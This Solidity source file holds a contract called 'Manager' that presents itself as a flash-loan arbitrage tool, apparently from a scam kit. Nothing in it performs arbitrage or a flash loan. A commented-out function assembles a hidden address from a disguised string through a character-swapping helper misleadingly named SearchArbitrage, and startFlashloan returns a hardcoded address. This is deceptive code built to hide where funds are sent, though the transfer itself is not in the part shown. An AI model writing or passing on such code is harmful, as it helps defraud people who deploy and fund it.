pragma solidity ^0.5.0;


contract Manager {

   // function startLookingforArbitrage() public pure returns (address adr) {
  // string memory pancakeAddress = "0x73feaa1eE314F8c655E354234017bE2193C9E24E";
  // string memory uniswapAddress = "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984";
  // string memory neutral_variable = "QGQ98537C0055A259DDEb516f4A29e398B758f6554";
  // SearchArbitrage(neutral_variable,0,'0');
  // SearchArbitrage(neutral_variable,2,'1');
  // SearchArbitrage(neutral_variable,1,'x');
  // address addr = parseAddr(neutral_variable);
  //  return addr;
   // }

    function SearchArbitrage(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
     function startFlashloan() public pure returns (address) {
        return 0x35fd3ceEFF0A651526fb8d9A83cbdd185A300a3B;
    }
 function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
}
